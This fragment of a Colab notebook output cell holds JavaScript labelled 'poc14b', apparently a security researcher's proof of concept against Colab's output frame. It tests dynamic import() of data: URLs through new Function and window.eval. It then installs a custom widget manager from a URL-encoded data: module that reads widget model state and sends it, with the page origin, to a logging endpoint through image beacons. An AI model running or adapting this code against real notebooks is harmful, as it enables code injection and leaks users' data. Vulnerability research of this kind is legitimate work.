            "application/javascript": "\n(async function poc14b() {\n  const B = 'https://colab.research.google.com/__poc14b';\n  const log = async (t, v) => {\n    try { await fetch(B+'/'+t+'?v='+encodeURIComponent(String(v).slice(0,400))); } catch(e) {}\n  };\n  const logS = (t, v) => { new Image().src = B+'/'+t+'?v='+encodeURIComponent(String(v).slice(0,400)); };\n\n  await log('start', location.origin);\n\n  // TEST 1: Can import() work at all from this frame?\n  try {\n    const m = await import('data:text/javascript,export const x = \"hello_poc14b\"');\n    await log('IMPORT_DATA_SIMPLE', 'ok|x=' + m.x);\n  } catch(e) { await log('IMPORT_DATA_SIMPLE_ERR', e.name+'|'+e.message.slice(0,150)); }\n\n  // TEST 2: import() via new Function (same path as installCustomManager uses)\n  try {\n    const loader = new Function('url', 'return import(url)');\n    const m2 = await loader('data:text/javascript,export const y = \"via_new_function\"');\n    await log('IMPORT_VIA_NEWFN', 'ok|y=' + m2.y);\n  } catch(e) { await log('IMPORT_VIA_NEWFN_ERR', e.name+'|'+e.message.slice(0,150)); }\n\n  // TEST 3: import() via window.eval (exact wi() path)\n  try {\n    const loader2 = window.eval(\"new Function('url', 'return import(url)')\");\n    const m3 = await loader2('data:text/javascript,export const z = \"via_window_eval\"');\n    await log('IMPORT_VIA_EVAL', 'ok|z=' + m3.z);\n  } catch(e) { await log('IMPORT_VIA_EVAL_ERR', e.name+'|'+e.message.slice(0,150)); }\n\n  // TEST 4: installCustomManager with the data: URL, then try to manually trigger\n  const DATA_URL = 'data:text/javascript,export%20const%20loaded%20%3D%20true%3B%20export%20async%20function%20createWidgetManager%28c%29%7B%20new%20Image%28%29.src%3D%27https%3A%2F%2Fcolab.research.google.com%2F__poc14b%2FCWM_FIRED%3Fo%3D%27%2BencodeURIComponent%28location.origin%29%3B%20return%20%7Brender%3Aasync%20function%28id%2Cel%29%7Bconst%20s%3Dawait%20c.getModelState%28id%29%3B%20new%20Image%28%29.src%3D%27https%3A%2F%2Fcolab.research.google.com%2F__poc14b%2FSTATE%3Fid%3D%27%2BencodeURIComponent%28id%29%2B%27%26s%3D%27%2BencodeURIComponent%28JSON.stringify%28s%29.slice%280%2C300%29%29%3B%20return%20true%3B%7D%7D%3B%20%7D';\n  try {\n    window.google.colab.widgets.installCustomManager(DATA_URL);\n    await log('CWM_INSTALLED', 'ok');\n  } catch(e) { await log('CWM_INSTALLED_ERR', e.message); }\n\n  // TEST 5: Use output.renderOutput with widget MIME + metadata (this IS the Z.prototype.U path?)\n  // Try passing metadata with the url to see if it triggers the install+render\n  try {\n    const area = window.google.colab.output.getDefaultOutputArea();\n    await window.google.colab.output.renderOutput({\n      data: {\n        'application/vnd.jupyter.widget-view+json': {\n          version_major: 2, version_minor: 0,\n          model_id: 'poc14b-render-test-id-0000000001'\n        },\n        'text/plain': ['Widget']\n      },\n      metadata: {\n        colab: { custom_widget_manager: { url: DATA_URL } }\n      }\n    }, area);\n    await log('RENDER_OUTPUT_WIDGET', 'no_throw');\n  } catch(e) { await log('RENDER_OUTPUT_WIDGET_ERR', e.name+'|'+e.message.slice(0,150)); }\n\n  // TEST 6: Inspect what Z (the output manager) is after installCustomManager\n  // Try to get a reference to the output manager's internal state\n  try {\n    // Z.g should now be al instance after Kl was called\n    // We can't access Z directly, but the outputs object is at a.outputs\n    // a.outputs.g should be the al instance with a.outputs.B = DATA_URL\n    // Try to infer if install happened by checking if .g.url matches\n    const area = window.google.colab.output.getDefaultOutputArea();\n    await log('OUTPUT_AREA_ID', area ? area.id : 'null');\n  } catch(e) { await log('OUTPUT_AREA_ERR', e.message); }\n\n  await log('done', Date.now());\n})();\n",
